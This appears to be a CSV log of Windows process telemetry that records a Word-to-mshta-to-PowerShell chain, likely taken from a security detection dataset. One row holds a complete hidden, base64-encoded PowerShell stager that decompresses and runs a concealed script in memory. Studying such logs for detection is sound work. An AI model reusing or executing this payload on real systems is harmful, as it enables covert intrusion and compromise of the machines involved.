eabbc734-aed2-8262-9952-6a4fe1c3fd5e,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},661567
9a20c3e5-ff37-83a9-9540-aaf8f164bda9,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},661483
d24b0f23-2987-853d-b68e-7c08cab84926,"{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe ""C:\\Program Files\\Microsoft Office\\Office14\\WINWORD.EXE"" '}",661694
fb4f5eee-817b-80ff-8218-627d1bce66da,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},662991
64cc22cf-68cc-8a21-b8d6-15902bfb63b9,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},662984
e6cd0b48-5b8a-8db5-aa98-7ff727e0f26d,"{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe ""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkAGUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAegBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATQBVAEwAMQAyAEkAQwBBADcAVgBYAGIAWQAvAGEAUgAnACcAKwAnACcAaABEACcAJwArACcAJwArAFgAcQBuAC8AdwBZAHEAUQBNAEEAbwBIAE4AcgBpAFgAdQAwAGkAUgBhAHMAUAB4AEYAbQB4AGUALwBIAFoAQQBVAFcAWABzAHQAYgAzAEgAMgBrAHYAcwBOAFIAeABwACsAOQA4ADcAQwAvAGoAdQBvAGwAegBhAHQARgBJAHMAVwBhAHgAMwBaADIAWgBuAG4AMwBsAG0AWgB7ADEAfQBtAEwAMQBHAGUAWQBwAHsAMQB9AEkAZQBDAEgALwA4AC8ASgBOAHcAZQBhAFoAZQA1AGkAVwBDAFcAUABHAEwAcwBGADAAWABLAHIAdABzAHUAcAAzAFcAbgBwAGMAcgBPADYAcAAxAGgAQQArAEMAdQBGAEoAMwB1AHkANQBOAFAASgB5AHUAMwA3AC8AdgBGAEYAbQBHAFUAbgBiACsAYgB2AFEAUgBVAC8ATQBjAEoAUgB1AEMAVQBTADcAVwBoAEQAOABGAE4AMABZAFoAdQBwAHAAcwBIAHAARABQAGgARAArAEUAeQB1ACsATgBQAHEARQBiAGoAMQB6AEUAagBoADMAUABqADUARgB3AHAAYQBZAEIAWAB4AHQAVAAzACsATwBlAE4AYwB3AGQAdwBVAHkAcwAvAHYAWgBiAHQAYgBhADYAawB0AGUATgB1ADAAKwBGAFIAMwBLAHgAYQBoACcAJwArACcAJwA1AHoAaABwAEoARwBRAEUAaQAxAEoAdgB4AFYANAB4AHQAYQB4AHgAMABTAHEAegByADIATQA1AHIAVABrAEQAVgBjAG4ATABaACcAJwArACcAJwBiAEQAVAB2AE4AdgBSAEEAWgBZAEcAMgBQAGQATQBSAGkARwB1AFIAVgBPAE0AegB6AGMAVABMAEUAaQBpAHcAOQBuADQAcQBiAE8AUQB1AEoAVgBSAGgATwBNACsAcQByAFEAWgBDAGgAUABLAC8AVwBoAFIAWABmAFkATABWAGUALwB5AHEAdQBMAHIAdgBQAGkANQBUAGgAQgBEAFcARwBLAFUATQBaADMAWgBrAG8AMgAyAE0AZgA1AFkAMgBCAGwAdwBZAEUAegBWAEcANABCAGkAMgBUAFoAVABpAE4AMQByAFUAYQBpAE8AMwBwAEYAbwBtAFYAdABDAEMAawBMAHYAdwBYAE0ANgBLAEIARABpAFYAMgAzADYAcwBrAHYAbABRAEMAcQBTAG4ATABhAG4AVwBJADYAaQB2AG4AMQBHAGwAUQBFAEgAVABXAHIATAA3AGkANgBJAGsASgBOAFgAaQBlADIAQQBBAEkALwBzAFYAQgBEAEUAcwBHAEgAWgBlAHQAVgB5AGoAMABQAEYARQArAHEAOQBNAEsAQQBwAC8ARgBLAGMAMwB4AFMAZgBlAEQASQBOAFUARgBIAFgAYgAzAEcATQAyAE8AOABGAG0AeABzAHsAMQB9AEwAVgAxAGsAKwBJAEMANQBWAEEAQwB0AFAANgA5ADEAcQBUAFMAMQBXAHUAVwBBAFEAdwBzADMASQBvAEQAdABiAFAAKwBsADgAUQBvAEIASgB3AHAAWAA4AHsAMQB9AGMAeABlAEYATwBFAFgAZABZACsAbwBsADIAQwAvADUASwByADQAVwBFAHgAUQBTAGQATQBLAGoAVQBZAG8AWgA0AEoANQBZAHYAUwB5AHsAMQB9AG8ASQBzAEkAaQBqAHoARwBVAGUAYgBVACsARQByAHQATABzAEgAcwBTAFYAYwByAE0AQQBsAFEAcAB2AG8AUQAxAHgAeQA4AHsAMQB9AHAARABYAHYAbgBUAG0ASABEAGkAeAAnACcAKwAnACcATwBrAHgAMQBsAEEAJwAnACsAJwAnAEIAMgA1ADIALwB7ADEAfQBhAGkAVwBFAEwARQBHAGwAOQBDAFUAegBqAHUAWAB1AC8AQgB1AEUAcQBoADMAaQA1AFgAbABkAG0AQgBhAFEAcABuADUAZABNAEoARgBIAFUARgBBAFgAMQBEAFQASABsAHkAVwAxAFkAUABRADAAcgBEADYANwBxAHgAZQBFAFkAZAAvAEwAVwBXAGwAdQBYAGYAcwBDAHoATQB1AG0ASABaAHIAbQBMAEMAdAA4AGkAQwBrAEEAWQBKAGsANwA1AEcATwBQAGMARAB6AHEAdwB7ADEAfQBBAEgAUwBEAHUAYQBPAEMAbwAzAHIANwA2AEsAUgBzAGMAagBCAEgASQBIAEwATwAwAGgARwBqAEQARABVAFQAQQBaAFoAMABvAEcAZgBwADUAWQBVAFcAdQBZAGkAQQAyAFQASABVAEUASgB5AEoAeQBLAFIAbwA5ADQARQBaAFMASQBTADQAYQBjAHEATwBWAEYASwBLAGkAKwA2AG0AYQBaAEIAbQBmAE8AYwAxAFIASwBPAEYANAA0AEMAYQBFADIAQwAnACcAKwAnACcAVwBWADEAdwBjAEUAWgB7ADEAfQB3AEwARQBFAFEAWgBtAC8AUwA4AFgAdgBxADQAOAA0AEUAcwBuAFEANQBlADQAaQBHAFYAcQByAGIAUQBqADQAKwBTAHYASABNAEwAZgBIAHoAaABCAEwALwBpAGMAMABNAHsAMQB9AFkASQBOAEgATABhAEsASgA1AE8AYgBwAFcAegBqAFYARwBmAE4ATwBjADQASwBrAEsAegAyAEsAWQBFAGoAJwAnACsAJwAnADAAWQBiAGIARQA4AFAATQBDAHIAdwAyAHQAMwAzAHcAVQBmAFIANQBRAGQAUAAzAFkASABUAGQAMwB2ADUATgBOACsANwAwAGIARgBoACsAagB7ADEAfQAzAHgAaQBxAEgANAB3AEMAZABHACcAJwArACcAJwB1AEMAMwAnACcAKwAnACcATQB4AFIAVwBHAGUAcQBEAG0AWgBZADAAcABUAFkAMQB5AFEATAB4AHYAYQBRAEwAWQBiAHEAdwBNAEoAUwB0AEkAaAA5AEkAawAzAEIAaAByAG4ASQBKAFgAdwBZAHUATAByAGYAMQBUADQAZgBXAGoAbgBRAFYARgBFAEcAOQA1AEwAYQBiAGkAdQBUAHQAcgBRAEYAOABCAFoAWQBqAHIAWgBxAFkAQwBUADQAOABEAGkARwBNAFIAVABUAHkAVgB7ADEAfQBiADUAcABvADAASgBIAGUAagB6AG4AegBqAHQAJwAnACsAJwAnAG4AcABMAGwAdwB5AGEAUwBpADgATwBYAFoAcQBiADEANAB0AHUAcwA5AG0AOABEAGIAegArAEwAeQBSAFEATgBSAHEAMABTAE8ARQA1AGMAMgBvAE4ALwBFAFIAcgBOAGgAMAA5AFkASgBZACcAJwArACcAJwB0AEcANQBiADkATgB2ADcATQAnACcAKwAnACcAegAyAG0ANQB0ADkAZQBlACsANQB7ADEAfQB2AHoAQgB0ADUALwBLAEIARwBIADMAdgBCAGIAcABQAE0AOQAwAEYAYgBqAHkAdwB5AGkAMwBSAEwATABmAFIAdQBIAGoAbAB7ADEAfQB4ADMAaQBZAHYAUgBzAE8AbwBwAGIAUgAyAFUAYQB6AGUAKwAyAHcANgBUAHYAMwBTADMAYwAwADkAdQA1AG4AZQA4AFAAUwAyACsATQBIAHYAVABYAHMAeABHAE8AegBOAHoAZQBzAHoAaQBIAGEAOQBFAG0AMgBOAEwAWABCADAAagBXAHkAegBSAEYAMABXAHYARgB4ADAANQBMAEoAKwBQAE4AJwAnACsAJwAnAFcAewAxAH0AYgAwAEsAbwArAHYATABrADQANgBpADYASwBaAG0ATABkAHgAbAA3AEMAZgBiAEoAegB0AHEAUAA3AHAAMgAwAGkAUgB0ADMAagBxAFcAMwBhAEoAZAA4AEoAbQArAFAAWQBMAEQARQAzAHoARAAvAFIANgAzAFkAMgBPADUAbABSAFMAegBxADgAbQBMADEAbwAyADgAYQBNADkAegAvAGMARwBZAGIAZQB6AGwAWQB0AEUATwBaAHIANABwAE8ANQBQAGUAYQBMAHUAeABSAHAAYgA5ADAAQgB0AGIALwBlAFgARQAnACcAKwAnACcAZABPAFAASABoAGUAdQByAGQAagArACsAeAA4AHQAbQB2ADMAbgByAGoAaAA2AEoAUQBkAFgAdQBtAE0AWQA5AHcARQBRAE8ATABDAGQANQB5AEIAeABUAGUAUQBkAHIAcgBoAGYAdABRAG0AKwBvAEEAawA2AGQAawBkAEsAbgBkADMAYQBmAGgAawA0AFMAeQAvAFAAZABkAGYALwBrAEYAKwBEAG8ASgBCAEgAVAA0AHAAagBMADkAdwA0AEQAMgAvAGEARwBrAGEAVQBDADcAdgBPAHAASwBpAHYAVABwAG0ATwAxADcANAAzAHIATwB4ADgAOAAxAGoANwBOACsAcABGADYAQgB5AE0AUAAzAHAAbQBxAFcAVgA0AFAAYgArADIAMwA5ADAAMQA1AEMAWABzAHIAYQBlAHEAMABJAG4AVQBJAGEANwBhADgAcABIAGMANwBiADYAVABzACcAJwArACcAJwBtAHcANwBuAHoAMgBjAGwASAA2AGoAKwBCAE8AegBmAEUAMQBjADMAdwB1AHYAKwBuAHMAZAA0ADcANgBmAHoAWQA5AEMALwBLAHoAYQBKAEkANgBuAGoALwBZAEYANQBJAC8AQgBaAHMANQBxADMAOQBvAGMAMwBrAEEAUQByAEcANgBlAHMAMwBWAHAAWAA5AHEATgBQADIAJwAnACsAJwAnAFkAdwAzAGkAWgA5AC8AcQBoAEQALwBSAFMAWgA4AHEAdwBYAHEAWABwAGIAJwAnACsAJwAnAEgASABvAEUATQB7ADEAfQBkADUAVwBGAHEAawBlACcAJwArACcAJwB6AFgAcQBYAFoAagBXAGwAbQBHAHUASQBJAGwAeAA3AHQAaQBoAEwARQBZAEYANwBBACcAJwArACcAJwB0AHcAawB5AHUAeABXAEMAYQBFACsANwA1AFcAOABxAFUARwBiAFAAagBkAFAAMwBzAHYAdAA0AGMAbQBsADEAMABZADEANABVAG0AdwA5AHQAeABDAHkANgBuADMANwA1AGYAewAxAH0ASQB0AFEATABuAHMAeQBOAE0AJwAnACsAJwAnAFUAbwBqAEYAdABlAGwAeAA3AFkAawBRAGUAdQBUAEgAaQBYAGwAVgBCAGkAKwAvADIAQQBkAHUAagB1AEsASgAyAE4AMQAzAGoAdwBCAGwAOQBJADIATwBkAGsARwBjAHoAewAxAH0AVQBSAFAARgBIAFEAdwBVADMASgBBAGIARgArAHAAdAB7ADEAfQBmAFEAcwAzADIASAB7ADEAfQBMAHgAUgBWAHEALwBiAG4AbQBjAGYAUQAnACcAKwAnACcAMABTAHMAbABMADcARQA2AEgAZQBtAEwAQgBTACsAQQBBAE0AUgBsAE8AdgBlAEoAWABvAHoATQA5AHcATQBBAFYAKwBpAFIAVQBHAEwAOAA0AHYATAB5AEkAVgBJADUAcQA5AGkATQBwAGMAeQBuAGMATQBmAHcARQAvADAASwBaADUANwBsAC8AVwBQADAAdQBHAGsAbAAxAGoAcwAxAFgAawAxADkATwB2AE8AaAAyAFAAKwB6ADAAcgBvAGMAWgB5AEoAbgBRAGYAQQB7ADEAfQA2ADMANABWAGUAQgBlAEcAUwBJAGkAOQBpAEMAMgBFAEIALwBvAGUAWABoAC8AOQBCAG0AQgBUAHMAeQBvAEEATAA1ADYAbgA5AC8AUQAyAGgAZgAxAGYAeQBtAHsAMQB9AHcAQQBBAEEAewAwAH0AewAwAH0AJwAnACkALQBmACcAJwA9ACcAJwAsACcAJwBnACcAJwApACkAKQApACwAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgBNAG8AZABlAF0AOgA6AEQAZQBjAG8AbQBwAHIAZQBzAHMAKQApACkALgBSAGUAYQBkAFQAbwBFAG4AZAAoACkAKQApACcAOwAkAHMALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQA9ACQAZgBhAGwAcwBlADsAJABzAC4AUgBlAGQAaQByAGUAYwB0AFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAA9ACQAdAByAHUAZQA7ACQAcwAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQA9ACcASABpAGQAZABlAG4AJwA7ACQAcwAuAEMAcgBlAGEAdABlAE4AbwBXAGkAbgBkAG8AdwA9ACQAdAByAHUAZQA7ACQAcAA9AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBQAHIAbwBjAGUAcwBzAF0AOgA6AFMAdABhAHIAdAAoACQAcwApADsA'}",662993
4a6d7061-a212-8c7e-b5da-53b816b08188,{'subject': 'c:\\windows\\system32\\mshta.exe None'},662944
b7e94d13-26d6-8864-9b4b-487dfeec20ec,{'subject': 'c:\\windows\\system32\\mshta.exe C:\\Windows\\System32\\mshta.exe -Embedding'},662987
64cc22cf-68cc-8a21-b8d6-15902bfb63b9,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},662984
